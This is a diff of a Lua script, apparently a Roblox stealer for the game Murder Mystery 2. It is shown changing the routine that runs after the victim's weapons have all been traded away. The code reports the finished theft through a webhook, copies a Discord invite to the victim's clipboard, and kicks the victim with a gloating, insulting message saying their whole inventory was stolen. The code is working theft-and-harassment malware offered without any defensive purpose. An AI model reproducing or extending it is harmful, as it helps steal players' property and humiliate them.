@@ -240,9 +240,14 @@ local function TradeFinalizado()
     end
 
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
-    task.wait(3)
-    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
+task.wait(1)
+
+-- Copiar URL automáticamente al portapapeles
+if setclipboard then
+    setclipboard("https://discord.gg/4VySnCHy") -- <-- la URL que quieras
 end
+
+LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 
 -- Trade principal
 local function doTrade(targetName)
